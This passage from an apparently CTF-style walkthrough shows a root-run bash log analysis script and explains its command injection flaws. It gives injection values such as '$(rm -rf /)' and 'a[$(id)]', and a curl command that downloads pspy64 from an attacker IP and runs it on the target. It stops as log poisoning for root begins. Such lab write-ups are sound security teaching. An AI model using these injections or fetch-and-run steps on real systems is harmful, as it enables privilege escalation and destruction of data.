+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;INFO&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">blue&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;WARN&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">yellow&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;ERROR&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">red&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">reset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%s%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s%s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">reset&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ERROR Messages&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_messages&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s1">&amp;#39; ERROR &amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="sa">F&lt;/span>&lt;span class="s1">&amp;#39; ERROR &amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="s2">[+] ERROR Messages:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$error_messages&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">red&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RED&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">reset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RESET&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print red $0 reset}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Eureka Errors&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">eureka_errors&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s1">&amp;#39;Connect to http://localhost:8761.*failed: Connection refused&amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">eureka_count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$eureka_errors&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">wc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">l&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{YELLOW}&lt;/span>&lt;span class="s2">[+] Eureka Connection Failures:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{YELLOW}&lt;/span>&lt;span class="s2">Count: $eureka_count$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$eureka_errors&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">tail&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">yellow&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$YELLOW&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">reset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RESET&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print yellow $0 reset}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">display_results&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{BLUE}&lt;/span>&lt;span class="s2">----- Log Analysis Report -----$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Successful logins&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{GREEN}&lt;/span>&lt;span class="s2">[+] Successful Login Counts:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_success&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;${!successful_users[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">]}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{GREEN}%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$count&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_success&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">total_success&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{GREEN}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Total Successful Logins: $total_success$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Failed logins&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="s2">[+] Failed Login Attempts:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_failed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;${!failed_users[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">]}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{RED}%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$count&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_failed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">total_failed&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Total Failed Login Attempts: $total_failed$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># HTTP status codes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{CYAN}&lt;/span>&lt;span class="s2">[+] HTTP Status Code Distribution:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_requests&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Sort codes numerically&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="nb">sorted&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">k1&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{STATUS_CODES[*]}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">unset&lt;/span> &lt;span class="n">IFS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">entry&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{sorted[@]}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_requests&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">total_requests&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Color coding&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$GREEN&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$YELLOW&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">5&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RED&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$CYAN&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{color}%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$count&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$code&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{CYAN}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Total HTTP Requests Tracked: $total_requests$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Main execution&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_logins&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_http_statuses&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">display_results&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">tee&lt;/span> &lt;span class="s2">&amp;#34;$OUTPUT_FILE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_log_errors&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">tee&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="s2">&amp;#34;$OUTPUT_FILE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{GREEN}&lt;/span>&lt;span class="s2">Analysis completed. Results saved to $OUTPUT_FILE$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we check the &lt;strong>analyze_http_statuses()&lt;/strong> &lt;em>function&lt;/em> we can see there is &lt;strong>unsanitized input handling&lt;/strong> and &lt;strong>potential command injection vulnerabilities&lt;/strong>.&lt;/p>
+&lt;h4 id="1--command-injection-risk">1. &lt;strong>Command Injection Risk:&lt;/strong>&lt;/h4>
+&lt;p>![[Pasted image 20250429114119.png]]&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;code>echo &amp;quot;$line&amp;quot;&lt;/code> interprets &lt;strong>shell metacharacters&lt;/strong> in the input.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>If &lt;code>$line&lt;/code> contains something like &lt;code>$(rm -rf /)&lt;/code>, it will &lt;strong>execute the command&lt;/strong> instead of treating it as text.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;div class="pagebreak">&lt;/div>
+&lt;h4 id="2-unvalidated-integer-comparison">2. &lt;strong>Unvalidated Integer Comparison:&lt;/strong>&lt;/h4>
+&lt;p>![[Pasted image 20250429121049.png]]&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>-eq&lt;/code> is a &lt;strong>numeric comparison&lt;/strong>.&lt;/li>
+&lt;li>If &lt;code>$code&lt;/code> is &lt;strong>NOT a number&lt;/strong>, bash will &lt;strong>evaluate&lt;/strong> it&lt;/li>
+&lt;li>If &lt;code>$code&lt;/code> is something like &lt;code>a[$(id)]&lt;/code>, then bash &lt;strong>will expand&lt;/strong> the &lt;strong>&lt;code>$(...)&lt;/code>&lt;/strong> &lt;strong>before comparison&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;code>a can be treated like a variable name, where a[...] can be treated as a kind of array access (even if a doesn't exist, Bash doesn't care initially during parsing). So Bash parses inside the [ ... ], and executes the $(...).&lt;/code>&lt;/p>
+&lt;h4 id="since-we-know-the-script-has-a-command-injection-vulnerability-its-time-to-verify-if-the-script-is-running-as-root-or-else-for-that-we-need-to-monitor-the-file-system-hence-we-will-be-using-pspy64-for-this-purpose">Since we know the script has a command injection vulnerability. Its time to verify if the script is running as &lt;em>root&lt;/em> or else. For that we need to monitor the file system. Hence we will be using &lt;strong>Pspy64&lt;/strong> for this purpose.&lt;/h4>
+&lt;h2 id="12-monitoring-file-system-via-pyspy64">12. MONITORING FILE SYSTEM VIA PYSPY64:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#/ON-TARGET/#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -O http://10.10.16.91:1234/pspy64
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod +x pspy64
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./pspy64 -cpf -i &lt;span class="m">1000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429124031-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We see that:&lt;/p>
+&lt;ul>
+&lt;li>The log analysis script (&lt;code>/opt/log_analyse.sh&lt;/code>) runs as&lt;strong>root&lt;/strong>(&lt;code>UID=0&lt;/code>).&lt;/li>
+&lt;li>It processes log files (&lt;code>/var/www/web/*/log/application.log&lt;/code>) containing HTTP status codes.&lt;/li>
+&lt;li>If an attacker can &lt;strong>modify the log file&lt;/strong>, they can inject malicious payloads that get executed when parsed.&lt;/li>
+&lt;li>&lt;strong>Log Files Are Often Writable&lt;/strong>&lt;/li>
+&lt;li>Many apps allow logging unvalidated input (e.g., user agents, URLs).&lt;/li>
+&lt;li>If log rotation isn’t strict, attackers can append malicious entries.&lt;/li>
+&lt;/ul>
+&lt;h2 id="13-check-execution-format-of-the-log">13. CHECK EXECUTION FORMAT OF THE LOG:&lt;/h2>
+&lt;p>In order to craft the payload we need to know what is the format of the log which the script executes every time:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tail /var/www/web/cloud-gateway/log/application.log -n3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429145832-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>The &lt;code>log_analyse.sh&lt;/code> script is likely parsing logs in this format:&lt;/p>
+&lt;ul>
+&lt;li>It &lt;strong>searches for &lt;code>HTTP.*Status:&lt;/code>&lt;/strong> (&lt;code>grep &amp;quot;HTTP.*Status: &amp;quot;&lt;/code>).&lt;/li>
+&lt;li>Then &lt;strong>extracts the status code&lt;/strong> (&lt;code>grep -oP 'Status: \K.*'&lt;/code>).&lt;/li>
+&lt;/ul>
+&lt;h4 id="our-goal-1">OUR GOAL:&lt;/h4>
+&lt;ul>
+&lt;li>Check if the current user have the permission to modify or delete the application.log&lt;/li>
+&lt;li>If there is a permission to delete the application.log we can replace our malicious one with the same name as &lt;strong>application.log&lt;/strong> and can obtain the root.&lt;/li>
+&lt;/ul>
+&lt;h2 id="14-privilege-escalation-for-root">14. PRIVILEGE ESCALATION FOR ROOT:&lt;/h2>
